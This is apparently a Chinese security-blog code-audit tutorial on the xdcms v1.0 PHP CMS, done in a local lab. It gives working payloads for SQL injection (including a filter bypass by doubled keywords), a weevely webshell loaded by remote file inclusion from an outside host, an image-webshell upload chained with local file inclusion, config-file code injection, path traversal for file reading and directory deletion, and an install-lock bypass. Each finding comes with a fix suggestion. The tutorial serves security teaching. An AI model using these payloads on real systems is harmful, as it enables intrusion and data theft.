@@ -1,0 +1,791 @@
+# 代码审计新手入门——xdcms_v1.0
+
+阅读量 **1224264**
+
+|评论 **3**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2019-11-26 16:00:10
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p0.ssl.qhimg.com/t018ba4776ebf137c16.png)
+
+对xdcms的一次审计练习，萌新入坑必备
+
+## 前言
+
+大家好，我是kn0sky，这次整了一个以前的小CMS进行练手，xdcms，版本: v1.0，
+这个CMS虽然有点老，但是用来新手入门练手倒是挺不错的，在这里，你可以接触学习到多种sql语句的SQL注入漏洞，多种文件操作漏洞等等……
+
+审计的思路是：
+
+  1. 先大概浏览一下源代码，看看代码的逻辑大概是怎么运行的，找找关键的文件
+  2. 然后按照功能点进行测试
+
+环境准备：
+
+  * windows 7 虚拟机
+  * xdcms_v1.0源码
+  * PHPStudy: PHP 5.2.17 + MySQL 5.7.26 (因为这个CMS太老了，选新版本的PHP容易出问题)
+
+废话不多说，直接开始吧
+
+## 审计开始
+
+通读代码的时候注意了！ **不要直接拿到源码就去读！**
+
+我们需要先在虚拟机的phpstudy上把xdcms部署好，访问虚拟机IP进入xdcms的安装，安装完之后， **注意啦**
+，这个时候把安装完成后的源码复制出来，用这个源码进行审计！
+
+因为啊，有些文件啊，是在你安装完CMS之后才会出现的，拿安装之前的CMS去审计，会有些东西找不到的
+
+文件目录如图所示：
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/1.png)
+
+到此，我们可以正式开始代码审计啦
+
+###  大概浏览网站源代码
+
+通过跟读index.php文件（这个CMS的index.php里面文件包含里又是文件包含，一层又一层），跟读到`/system/function/fun.inc.php`文件，这里面开始就是网站的功能和内容了
+
+浏览目录，不难发现：网站的主要功能应该都在system目录中了  
+system目录下：
+
+  * function目录里装的都是网站的功能的函数
+  * libs目录里装的都是各种功能的类
+  * module目录里装的也是不同页面的功能的函数
+
+uploadfile目录：
+
+  * 应该跟文件上传有关
+
+api目录下：
+
+  * index文件有个文件包含和两个安全过滤函数
+
+data目录下：
+
+  * config.inc.php文件为数据库配置信息文件，这个文件就是安装完成之后才生成出来的  
+
+到这里，我们来整理一下现有的信息：
+
+    
+    
+    - 数据库采用GBK编码，可能存在宽字节注入
+    - 网站的主要功能在system目录下
+    - api目录下的index可能存在文件包含漏洞
+    - 网站的功能是通过访问index.php的GET参数m，c，f来选择的，m是文件夹，c是文件，f是函数调用，比如后台的m=xdcms
+    
+
+接下来直接开始测试吧
+
+###  按功能点进行测试
+
+按照正常用户的使用流程先来走一遍看看，这里的注册功能存在IP地址伪造，不过没啥用，就跳过吧，这里的注册页面只有注册，登录两个选择，连个找回密码都没有
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/3.png)
+
+注册好用户之后，进入普通用户的后台看看
+
+####  普通用户会员中心存在多处SQL注入漏洞
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/4.png)
+
+这个页面除了`我的订单`，`资料管理`，`修改密码`，`信息管理`这四个功能之外，其他功能都用不了
+
+那就一个一个点点看看吧
+
+打开我心爱的小burp
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/5.png)
+
+点击资料管理后，请求地址为index.php,请求参数为m=member,f=edit，我们跟着index.php去看看这两个参数是做啥的
+
+跟着跟着就到了/system/function/global.inc.php文件，我们来看一下相关代码：
+
+    
+    
+    //接收参数
+    $m=safe_replace(isset($_GET["m"])) ? safe_replace($_GET["m"]) : "content";
+    $c=safe_replace(isset($_GET["c"])) ? safe_replace($_GET["c"]) : "index";
+    $f=safe_replace(isset($_GET["f"])) ? safe_replace($_GET["f"]) : "init";
+    
+    include MOD_PATH.$m."/".$c.".php";   //调用类
+    $p=new $c();  //实例化
+    $p->$f();   //调用方法
+    
+
+大概意思就是文件包含module目录下的member目录，调用edit()方法
+
+    
+    
+        public function edit(){
+            $this->member_info(0);
+            $gourl=$_GET['gourl'];
+            $userid=$_COOKIE['member_userid'];
+            $info=$this->mysql->get_one("select * from ".DB_PRE."member where `userid`=$userid");
+    
+            $input=base::load_class('input');
+            $field=base::load_cache("cache_field_member","_field");
+            $fields="";
+            foreach($field as $value){
+                $fields.="<tr>n";
+                $fields.="<td align="right" valign="top"><span class="tdl">".$value['name']."：</span></td>";
+                $fields.="<td>".$input->$value['formtype']($value['field'],$info[$value['field']],$value['width'],$value['height'],$value['initial'])." ".$value['explain']."</td>n";
+                $fields.="</tr>n";
+            }
+    
+            assign('gourl',$gourl);
+            assign('member',$info);
+            assign("fields",$fields);
+            template("member/edit");
+        }
+    
+
+这里的变量userid从cookie获取值没有经过过滤就带入到sql的查询语句了，还是int型的注入:
+
+构造cookie中的member_userid为`4 and 1=2`，可以发现这里的用户信息都消失了
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/6.png)
+
+由此可判断验证这里存在sql注入漏洞
+
+也可以丢到sqlmap里跑一下,开了一堆工具，电脑太卡了我就不演示了
+
+除了这里存在SQL注入漏洞，这个界面还有几个地方也存在同样的SQL注入漏洞，产生漏洞的原因都是因为没有过滤从GET请求中获得的member_userid的值  
+分别是同个功能文件下的`edit_save()`、`password_save()`
+
+到这里，会员中心已经测试完成了，继续下一个功能
+
+**修复建议：**
+
+  * 使用intval对userid参数进行过滤
+
+####  网站API存在文件包含漏洞
+
+普通用户能点的功能真没几个，看看API目录的index.php还真会有收获
+
+源码如下：
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/7.png)
+
+从GET请求中获得两个参数c和f，c是要调用类的php文件名，下面直接就用c变量带入文件包含了
+
+如果是调用本地php文件，直接输入目录加文件名即可直接调用，如果调用的文件后缀不是php：可以进行00截断
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/8.png)
+
+如果php配置文件打开GPC（`magic_quotes_gpc`）的话，用00截断会不成功（00截断的条件：PHP版本小于5.3，GPC没有开启）
+
+**如果目标的php配置开启了allow_url_include**
+
+那我们就能进行远程文件包含，各种马，安排
+
+我图个简单，用weevely生成了一个，然后远程文件包含webshell
+
+    
+    
+    kn0sky@audit-Lab ~/ $ weevely "http://127.0.0.1:28000/api/index.php?c=http://192.168.2.222/wee.php?" knkn0
+    
+    /home/kn0sky/App/weevely3/core/sessions.py:219: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please read https://msg.pyyaml.org/load for full details.
+      sessiondb = yaml.load(open(dbpath, 'r').read())
+    
+    [+] weevely 3.7.0
+    
+    [+] Target:    127.0.0.1:28000:C:phpstudy_proWWWxdcms.comapi
+    [+] Session:    /home/kn0sky/.weevely/sessions/127.0.0.1/index_0.session
+    [+] Shell:    System shell
+    
+    [+] Browse the filesystem or execute commands starts the connection
+    [+] to the target. Type :help for more information.
+    
+    weevely> 
+    127.0.0.1:28000:C:phpstudy_proWWWxdcms.comapi $ :system_info
+    [-][channel] The remote script execution triggers an error 500, check script and payload integrity
+    [-][channel] The remote script execution triggers an error 500, check script and payload integrity
+    +--------------------+-----------------------------------+
+    | client_ip          | 192.168.77.2                      |
+    | max_execution_time | 300                               |
+    | script             | /api/index.php                    |
+    | open_basedir       |                                   |
+    | hostname           |                                   |
+    | php_self           | /api/index.php                    |
+    | script_folder      | http://192.168.2.222              |
+    | uname              | Windows NT K0-PC 6.1 build 7600   |
+    | pwd                | C:phpstudy_proWWWxdcms.comapi |
+    | safe_mode          | False                             |
+    | php_version        | 5.2.17                            |
+    | dir_sep            |                                  |
+    | os                 | Windows NT                        |
+    | whoami             |                                   |
+    | document_root      | C:/phpstudy_pro/WWW/xdcms.com     |
+    +--------------------+-----------------------------------+
+    127.0.0.1:28000:C:phpstudy_proWWWxdcms.comapi $
+    
+
+要是不能远程文件包含，如果有文件上传的地方，可以从这里本地文件包含个图片马去getshell
+
+**修复建议：**
+
+  * 可能的话，不要开启allow_url_include
+  * 尽量避免目录跳转，过滤 `../`
+
+接下来，该用管理员登录网站了
+
+####  管理员后台上传图片+本地文件包含组合漏洞
+
+后台地址：http://<IP>/index.php?m=xdcms&c=login
+
+默认管理员账号密码：`xdcms:xdcms`
+
+管理员后台在系统设置，网站配置的基本信息那里，可以上传网站logo
+
+这里的上传有个后端的图片后缀名检测：
+
+    
+    
+    //判断上传是文件还是图片
+    $type=isset($_GET['type'])?(int)$_GET['type']:0;
+    $size=500000;
+    $folder='image';
+    $allowed=array( 'gif', 'jpg', 'jpeg', 'png' );
+    
+
+图片文件名检测：
+
+    
+    
+    if ( $this->make_script_safe ){
+        if ( preg_match( "/.(cgi|pl|js|asp|php|html|htm|jsp|jar)(.|$)/i"$FILE_NAME ) ){
+            $FILE_TYPE                 = 'text/plain';
+            $this->file_extension      = 'txt';
+            $this->parsed_file_name       = preg_replace( "/.(cgi|pl|js|asp|php|html|htm|jsp|jar)(.|$)/i", "$2", $this->parsed_file_name );
+    
+            $renamed = 1;
+        }
+    }
+    
+
+图片文件类型检测：
+
+    
+    
+    if ( $this->image_check ){
+        $img_attributes = @getimagesize( $this->saved_upload_name );
+    
+
+然后还有个文件名修改
+
+这里可以用GIF89A绕过上传png后缀的php脚本
+
+可能是这个cms实在太老了，源码拿来直接运行还是出现了一些问题
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/9.png)
+
+上传完图片之后，应该是要回显上传的位置的，可能是出了什么问题，前端这一块我不太懂
+
+去看服务器上传文件的文件夹：
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/10.png)
+
+文件确实上传成功了
+
+位置是：`/uploadfile/image/20191114/201911141058530.png`
+
+这个图片的内容是：
+
+    
+    
+    GIF89A
+    <?PHP phpinfo();?>
+    
+
+我们去结合刚才的本地文件包含试一试
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/11.png)
+
+利用成功
+
+这里可以利用上传图片马来获取shell
+
+**修复建议：**
+
+  * 上传的对图片进行二次渲染或压缩处理
+
+####  管理员后台网站信息设置处存在二次漏洞
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/12.png)
+
+刚看到这里的时候，这里的网站地址:`http://127.0.0.5`我很好奇是干嘛的，因为它现在写的是127.0.0.5而网站的ip与这个无关，去翻翻源码看看这玩意是干嘛的
+
+    
+    
+    if($tag=='config'){
+        //判断url是否以/结尾
+        $urlnum=strlen($info['siteurl'])-1;
+        if(substr($info['siteurl'],$urlnum,1)!="/"){
+            showmsg(C("update_url_error"),"-1");
+        }//end
+    
+        $cms=SYS_PATH.'xdcms.inc.php';   //生成xdcms配置文件
+        $cmsurl="<?phpn define('CMS_URL','".$info['siteurl']."');n define('TP_FOLDER','".$info['template']."');n define('TP_CACHE',".$info['caching'].");n?>";
+        creat_inc($cms,$cmsurl);
+    
+
+点击保存后，网站获取siteurl没有经过过滤，就拼接到cmsurl字符串变量里去了，然后根据这个cmsurl生成配置文件
+
+配置文件：
+
+    
+    
+    <?php
+     define('CMS_URL','http://127.0.0.5/');
+     define('TP_FOLDER','dccms');
+     define('TP_CACHE',false);
+    ?>
+    
+
+这里我们可以构造siteurl：
+
+    
+    
+    hello');?><?php phpinfo();?>
+    
+
+点击保存后，我们去查看一下该配置文件：
+
+    
+    
+    <?php
+     define('CMS_URL','hello');?><?php phpinfo();?>';
+     define('TP_FOLDER','dccms');
+     define('TP_CACHE',false);
+    ?>
+    
+
+这里的配置文件内容生成外部参数可控，导致了可直接getshell
+
+访问该配置文件页面：`http://ip/system/xdcms.inc.php`
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/13.png)
+
+**修复建议：**
+
+  * 不要用这种方式直接修改配置文件
+
+####  管理员后台模板功能处存在任意文件读取漏洞
+
+后台看了看好像也没啥问题了，通过查看这个CMS相关文章得知，这个CMS有的功能有，但是不再后台页面里
+
+例如/system/module/xdcms/template.php文件的edit功能
+
+    
+    
+    public function edit(){
+        $filename=$_GET['file'];
+        $file=TP_PATH.TP_FOLDER."/".$filename;
+        if(!$fp=@fopen($file,'r+')){
+            showmsg(C('open_template_error'),'-1');
+        }
+        flock($fp,LOCK_EX);
+        $str=@fread($fp,filesize($file));
+        flock($fp,LOCK_UN);
+        fclose($fp);
+        assign('filename',$filename);
+        assign('content',$str);
+        template('template_edit','admin');
+    }
+    
+
+构造如下url即可查看到指定文件
+
+    
+    
+    http://IP/index.php?m=xdcms&c=template&f=edit&file=../../../data/config.inc.php
+    
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/14.png)
+
+当然，这需要管理员身份登录才能进行
+
+**修复建议：**
+
+  * 限制目录跳转
+
+####  管理员后台栏目管理存在SQL注入漏洞
+
+果然还是直接去读源码比较方便
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/15.png)
+
+这里的源码如下：
+
+    
+    
+    public function add_save(){
+        $config=base::load_cache("cache_set_config","_config");
+        $catname=$_POST['catname'];
+        $catdir=$_POST['catdir'];
+        $thumb=$_POST['thumb'];
+        $is_link=intval($_POST['is_link']);
+        $url=safe_replace($_POST['url']);
+        $model=$_POST['model'];
+        $sort=intval($_POST['sort']);
+        $is_show=intval($_POST['is_show']);
+        $parentid=intval($_POST['parentid']);
+        $is_target=intval($_POST['is_target']);
+        $is_html=intval($_POST['is_html']);
+        $template_cate=$_POST['template_cate'];
+        $template_list=$_POST['template_list'];
+        $template_show=$_POST['template_show'];
+        $seo_title=$_POST['seo_title'];
+        $seo_key=$_POST['seo_key'];
+        $seo_des=$_POST['seo_des'];
+        $modelid=modelid($model);
+    
+        if(empty($catname)||empty($catdir)||empty($model)){
+            showmsg(C('material_not_complete'),'-1');
+        }
+    
+        if(!check_str($catdir,'/^[a-z0-9][a-z0-9]*$/')){
+            showmsg(C('catdir').C('numbers_and_letters'),'-1');
+        }
+    
+        if($is_html==1){
+            if($config['createhtml']!=1){
+                    showmsg(C('config_html_error'),'index.php?m=xdcms&c=setting');
+            }
+        }
+    
+        $nums=$this->mysql->db_num("category","catdir='".$catdir."'");
+        if($nums>0){
+            showmsg(C('catdir_exist'),'-1');
+        }
+    
+        $sql="insert into ".DB_PRE."category (catname,catdir,thumb,is_link,url,model,modelid,sort,is_show,is_target,is_html,template_cate,template_list,parentid,template_show,seo_title,seo_key,seo_des) values ('".$catname."','".$catdir."','".$thumb."','".$is_link."','".$url."','".$model."','".$modelid."','".$sort."','".$is_show."','".$is_target."','".$is_html."','".$template_cate."','".$template_list."','".$parentid."','".$template_show."','".$seo_title."','".$seo_key."','".$seo_des."')";
+        $this->mysql->query($sql);
+        $catid=$this->mysql->insert_id();
+    
+        if($is_link==0){//生成url
+            $ob_url=base::load_class("url");
+            $url=$ob_url->caturl($catid,$catdir,$is_html);
+            $this->mysql->db_update("category","`url`='".$url."'","`catid`=".$catid);
+        }
+    
+        $this->category_cache();
+        showmsg(C('add_success'),'-1');
+    }
+    
+
+这里有一大堆参数没有任何过滤就直接带入sql语句进行插入了，此处可进行SQL注入
+
+在参数中加个单引号之后提交：
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/16.png)
+
+报错啦！直接报错注入即可
+
+构造如下payload进行报错注入：
+
+    
+    
+    seo_des=haha' or updatexml(1,(concat(0x7e,(select version()),0x7e)),1) or '
+    
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/17.png)
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/18.png)
+
+**修复建议：**
+
+  * 对输入的参数进行过滤
+
+####  管理员后台内容管理处存在SQL注入漏洞
+
+  
+出现问题的函数依然是add_save()，先来看代码：
+
+    
+    
+    public function add_save(){
+        $title=safe_html($_POST['title']);
+        $commend=intval($_POST['commend']);
+        $username=safe_html($_POST['username']);
+        $thumb=$_POST['thumb'];
+        $keywords=safe_html($_POST['keywords']);
+        $description=safe_html($_POST['description']);
+        $inputtime=datetime();
+        $updatetime=strtotime($_POST['updatetime']);
+        $url=$_POST['url'];
+        $catid=intval($_POST['catid']);
+        $userid=$_SESSION['admin_id'];
+        $fields=$_POST['fields'];
+        $style=$_POST['title_color']." ".$_POST['title_weight'];
+    
+        //此处省略验证数据存在的部分
+    
+        //添加content
+        $sql="insert into ".DB_PRE."content(title,commend,username,thumb,keywords,description,inputtime,updatetime,url,catid,userid,hits,style) values('{$title}','{$commend}','{$username}','{$thumb}','{$keywords}','{$description}','{$inputtime}','{$updatetime}','{$url}','{$catid}','{$userid}',0,'{$style}')";
+        $this->mysql->query($sql);
+        $last_id=$this->mysql->insert_id();
+    
+
+依然是一堆参数从POST提交上来没有经过任何过滤就进行了INSERT INTO操作
+
+构造title：
+
+    
+    
+    AASD' or (select updatexml(1,(concat(0x7e,(select version()),0x7e)),1)) or'
+    
+
+即可进行报错注入
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/20.png)
+
+**修复建议：**
+
+  * 对输入的参数进行过滤
+
+####  管理员后台数据库管理页面存在任意目录删除漏洞
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/21.png)
+
+地址为：`http://ip/index.php?m=xdcms&c=data&f=delete&file=`
+
+这个功能原本是删除备份文件夹的，但是可以通过../进行目录跳转来删除任意文件夹
+
+源码如下：
+
+    
+    
+    public function delete(){
+        $file=trim($_GET["file"]);
+        $dir=DATA_PATH.'backup/'.$file;
+        if(is_dir($dir)){
+            //删除文件夹中的文件
+            if (false != ($handle = opendir ( $dir ))) {  
+                while ( false !== ($file = readdir ( $handle )) ) {   
+                    if ($file != "." && $file != ".."&&strpos($file,".")) {  
+                    @unlink($dir."/".$file);    
+                    }  
+                }  
+                closedir ( $handle );  
+            }  
+            @rmdir($dir);//删除目录
+        }
+        showmsg(C('success'),'-1');
+    }
+    
+
+通过GET参数file获取目录名，然后进行判断是否是目录，如果是，则删除目录下的文件再删除目录，如果不是，直接返回 `success`
+
+我们在网站主目录下创建个文件夹123：
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/22.png)
+
+然后点击删除操作之后，在Burp中拦截修改：
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/23.png)
+
+发送后，我们再来看看网站根目录：
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/24.png)
+
+刚刚创建的123目录，没有啦！
+
+**修复建议：**
+
+  * 禁止目录跳转，过滤`../`
+
+####  管理员后台关键词管理页面存在SQL注入漏洞
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/25.png)
+
+这里又是一个后台管理页面访问不到的地方，通过输入url：`http://ip/index.php?m=xdcms&c=keywords&f=edit&id=1`才能访问
+
+从这里开始，终于遇到了带有安全过滤防御机制的漏洞
+
+我们先来看源码：
+
+    
+    
+    public function editsave(){
+        $id=isset($_POST['id'])?intval($_POST['id']):0;
+        $title=safe_html($_POST['title']);
+        $url=safe_html($_POST['url']);
+        if(empty($title)||empty($url)||empty($id)){
+            showmsg(C('material_not_complete'),'-1');
+        }
+        $this->mysql->db_update('keywords',"`title`='".$title."',`url`='".$url."'",'`id`='.$id);
+        $this->keywords_cache();
+        showmsg(C('update_success'),'-1');
+    }
+    
+
+这里的title参数和url参数被safe_html过滤了，我们来看看这个过滤是怎么回事：
+
+    
+    
+    //安全过滤函数
+    function safe_html($str){
+        if(empty($str)){return;}
+        $str=preg_replace('/select|insert | update | and | in | on | left | joins | delete |%|=|/*|*|../|./| union | from | where | group | into |load_file
+    |outfile/','',$str);
+        return htmlspecialchars($str);
+    }
+    
+
+这里进行了黑名单过滤，过滤sql注入常用关键字，将关键字替换为空，这显然很不靠谱嘛
+
+通过双写即可绕过：
+
+Burp拦截，构造payload，发送请求：
+
+    
+    
+    url=http://' or (sselectelect updatexml(2,concat(0x7e,(version())),0)) or '
+    
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/26.png)
+
+成功绕过安全过滤，成功注入！
+
+**修复建议：**
+
+  * 对输入的参数进行过滤
+
+####  后台联动菜单管理处存在SQL注入漏洞
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/27.png)
+
+源码如下：
+
+    
+    
+    public function add_save(){
+        $name=$_POST['name'];
+        $parentid=isset($_POST['parentid'])?intval($_POST['parentid']):0;
+    
+        if(empty($name)){
+            showmsg(C('material_not_complete'),'-1');
+        }
+    
+        if($parentid!=0){
+            $keyid=$this->get_parentid($parentid);
+        }else{
+            $keyid=0;
+        }
+    
+        $sql="insert into ".DB_PRE."linkage (name,parentid,keyid) values ('".$name."','".$parentid."','".$keyid."')";
+        $this->mysql->query($sql);
+        showmsg(C('add_success'),'-1');
+    }
+    
+
+无过滤获取参数name，直接带入insert into语句中进行插入操作
+
+构造payload如下：
+
+    
+    
+    name=lalala' or (select updatexml(2,concat(0x7e,(version())),0)) or '
+    
+
+即可报错注入
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/28.png)
+
+这个CMS的SQL注入漏洞可谓是多到不行，这里头还有大量漏洞出现原因相同的SQL注入漏洞
+
+这里就不多啰嗦了，
+
+练习到这里，想必对UPDATE，INSERT INTO，SELECT三种SQL语句的SQL注入有了一定掌握，接下来看点不一样的
+
+####  网站安装页面存在全局变量覆盖漏洞
+
+在网站的/install/index.php中开头有如下代码
+
+    
+    
+    foreach(Array('_GET','_POST','_COOKIE') as $_request){
+        foreach($$_request as $_k => $_v) ${$_k} = _runmagicquotes($_v);
+    }
+    function _runmagicquotes(&$svar){
+        if(!get_magic_quotes_gpc()){
+            if( is_array($svar) ){
+                foreach($svar as $_k => $_v) $svar[$_k] = _runmagicquotes($_v);
+            }else{
+                $svar = addslashes($svar);
+            }
+        }
+        return $svar;
+    }
+    if(file_exists($insLockfile)){
+        exit(" 程序已运行安装，如果你确定要重新安装，请先从FTP中删除 install/install_lock.txt！");
+    }
+    
+
+遍历传入的参数对数组进行赋值
+
+然后传入$insLockfile来判断程序是否安装
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/29.png)
+
+如果我们在访问这个页面的时候直接在GET参数中加上`?insLockfile=xyz`(反正是一个不存在的文件名就行)则可直接进入安装
+
+![](https://raw.githubusercontent.com/kn0sky/blog_img_resource/master/img-audit/3-xdcms_v1.0/30.png)
+
+**修复建议：**
+
+  * 通过其他方式来检测系统是否已安装
+
+## 总结
+
+该CMS没有使用框架，非常适合新手入门练习使用，当然，存在的漏洞不仅仅有这些，有兴趣的童鞋可以接着去探索，如果你觉得我文章中有什么需要进行改进的地方，欢迎随时与我联系。
+
+最后，非常谢谢大家花费了时间阅读本人的文章，谢谢大家
+
+![](https://p0.ssl.qhimg.com/t0169b608e39a7d0e3d.jpg)
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **kn0sky** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/193332](/post/id/193332)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [Web安全](/tag/Web安全)
+  * [代码审计](/tag/代码审计)
+  * [xdcms](/tag/xdcms)
+
+ **+1** __17赞
+
+ __收藏
+
+![](https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTKV1ojvcvfDzJeexrHQjl11WuWHeibcphMFM9rCkhZxEaqZSpr4slacO90icKtIHykWSEd7ia0Ru6TZQ/132)
+kn0sky
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
